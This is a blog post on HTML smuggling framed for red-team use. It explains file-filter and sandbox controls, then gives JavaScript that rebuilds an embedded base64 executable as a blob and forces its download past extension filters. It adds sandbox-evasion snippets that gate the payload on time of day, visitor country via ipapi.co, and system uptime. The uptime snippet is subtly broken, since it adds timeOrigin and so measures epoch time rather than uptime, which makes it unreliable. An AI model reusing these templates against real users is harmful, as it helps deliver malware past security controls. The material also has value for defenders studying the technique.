---
layout: post
title: "Make HTML Smuggling Great Again P1"
date: 2024-12-30
categories: security html
---

# Make HTML Smuggling Great Again P1

## Introduction

Letʼs start with Mitreʼs definition for HTML Smuggling:

> “Adversaries may smuggle data and files past content filters by hiding 
malicious payloads inside of seemingly benign HTML files. HTML documents 
can store large binary objects known as JavaScript Blobs (immutable data that 
represents raw bytes) that can later be constructed into file-like objects. Data 
may also be stored in Data URLs, which enable embedding media type or MIME 
files inline of HTML documents. HTML5 also introduced a download attribute 
that may be used to initiate file downloads.”

The adversary will use this technique to bypass certain security controls, 
such as firewalls/proxies for 'file filter blocks' and sandboxes. Letʼs dive a little 
bit into File Filter Blocks mechanism.

---

## File Filter Blocks

A file filter block is a control mechanism designed to prevent users from 
downloading or accessing specific types of files based on their file extensions.

### How File Filter Blocks Work

**Inspection**  
The system inspects file requests made by users (e.g., HTTP/HTTPS 
traffic). It identifies files by their extensions.

**Matching**  
The system compares the file's attributes (e.g., .exe, .mp3, .pdf) 
against a pre-configured blocklist.

**Action**  
If the file matches a block rule, the system denies access, cancels the 
download, and logs the attempt for review.

---

## Example: Bypassing File Filter Blocks with Blobs

Here’s a sample script to bypass file filter blocks using JavaScript:

```html
<script>
    function downloadFromBase64() {
        const base64String = "BASE64_STRING_HERE";
        const fileName = "putty.exe";
        const byteCharacters = atob(base64String);
        const byteNumbers = new Array(byteCharacters.length)
            .fill(0)
            .map((_, i) => byteCharacters.charCodeAt(i));
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray]);
        const link = document.createElement("a");
        link.href = URL.createObjectURL(blob);
        link.download = fileName;
        link.click();
        URL.revokeObjectURL(link.href);
    }
</script>
```

---

## Sandbox for Analysis of URLs

### Static Analysis
Static analysis evaluates the URL's components and associated metadata to identify malicious intent without executing any code or visiting the site.

- **URL Structure and Format:** Checks for anomalies such as excessively long URLs, obfuscated strings, or suspicious subdomains.
- **Domain Reputation:** Queries against databases to determine if the domain or IP is flagged as malicious.
- **Embedded Indicators:** Looks for encoded malicious scripts or patterns in the URL itself.
- **Certificate Validity:** Verifies if the SSL certificate is valid, expired, or suspicious.

### Dynamic Analysis
Dynamic analysis involves actively engaging with the URL in a sandbox environment to observe its behavior.

---

## Sandbox Evasion Techniques

### Play for Time
By delaying the payload execution, you can evade sandboxes that analyze samples for a fixed duration (e.g., 5 minutes).

```javascript
function isTimeNow905AM() {
    const now = new Date();
    const hours = now.getHours();
    const minutes = now.getMinutes();
    if (hours === 9 && minutes === 5) {
        console.log("The current time is 09:05 AM.");
        return true;
    } else {
        console.log("The current time is not 09:05 AM.");
        return false;
    }
}
```

### Detect Country Code
Target specific countries to evade external sandboxes.

```javascript
function detectCountry() {
    return fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            if (data.country === 'US') {
                console.log("User is in US.");
                return true;
            }
            console.log("User is not in US.");
            return false;
        })
        .catch(() => console.error("Error fetching user's country."));
}
```

### Detect High System Uptime
Check for low system uptime to identify sandboxes.

```javascript
function isSystemUptimeLessThan5Minutes() {
    if ('performance' in window && 'timeOrigin' in performance) {
        const uptimeMilliseconds = performance.now();
        const totalUptimeMinutes = (uptimeMilliseconds + performance.timeOrigin) / 60000;
        if (totalUptimeMinutes < 5) {
            console.log("System uptime is less than 5 minutes.");
            return true;
        }
        console.log("System uptime is greater than or equal to 5 minutes.");
        return false;
    }
    console.error("System uptime cannot be detected in this browser.");
    return false;
}
```

---

## Closing

As demonstrated, HTML Smuggling is a powerful technique to bypass traditional security controls such as file filter blocks and sandboxing mechanisms.

**Disclaimer:**  
The content here is provided strictly for educational and authorized red teaming purposes. Unauthorized use may result in severe legal consequences.
